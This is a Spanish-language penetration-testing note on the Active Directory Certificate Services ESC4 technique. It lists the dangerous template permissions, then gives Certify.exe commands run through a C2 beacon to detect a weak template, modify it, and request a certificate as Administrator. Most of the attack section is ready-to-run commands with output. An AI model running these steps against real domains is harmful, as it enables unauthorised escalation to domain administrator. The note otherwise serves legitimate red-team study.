---
tags: [ad, adcs, esc4, privilege-escalation, acl, certificates]
status: completo
---

# ESC4 — Certificate Template Access Control

> ACE permisivo sobre un template que permite a un usuario de bajo privilegio **modificar el template** y convertirlo en ESC1.

## Permisos de interés

| Permiso | Efecto |
|---------|--------|
| **Owner** | Control total implícito |
| **FullControl** | Control total explícito |
| **WriteProperty** | Editar cualquier propiedad |
| **WriteOwner** | Cambiar el propietario |
| **WriteDacl** | Modificar la ACL |

## Detección

```
beacon> execute-assembly Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

Template Name          : ESC4
Extended Key Usage     : Client Authentication
Vulnerabilities        : ESC4 — The template has insecure delegated permissions.
  Write Owner          : CONTOSO\Domain Users
  Write Dacl           : CONTOSO\Domain Users
  Write Property       : CONTOSO\Domain Users
```

## Ataque — modificar template → ESC1

```
# 1. Añadir flag ENROLLEE_SUPPLIES_SUBJECT al template
beacon> execute-assembly Certify.exe manage-template \
  --template ESC4 \
  --supply-subject \
  --quiet

# → Successfully modified the certificate template

# 2. Verificar que el flag está activo
beacon> execute-assembly Certify.exe enum-templates --template ESC4 --quiet
# Certificate Name Flag: ENROLLEE_SUPPLIES_SUBJECT

# 3. Explotar como ESC1
beacon> execute-assembly Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC4 \
  --upn Administrator --quiet
```

### Otros flags útiles con manage-template

| Flag | Efecto |
|------|--------|
| `--enroll <sid>` | Dar derechos de enrollment a un principal |
| `--manager-approval` | Toggle aprobación del manager |
| `--authorized-signatures 0` | Eliminar requisito de firmas |
| `--client-auth` | Activar EKU Client Authentication |
| `--supply-subject` | Activar ENROLLEE_SUPPLIES_SUBJECT |

> ⚠️ Recuerda revertir los cambios al template después del ataque.

## Ver también

- [[05-ad-attacks/adcs/esc1---client-auth-templates|ESC1 - Client Auth Templates]] — técnica que se activa después de modificar
- [[05-ad-attacks/adcs|ADCS]]
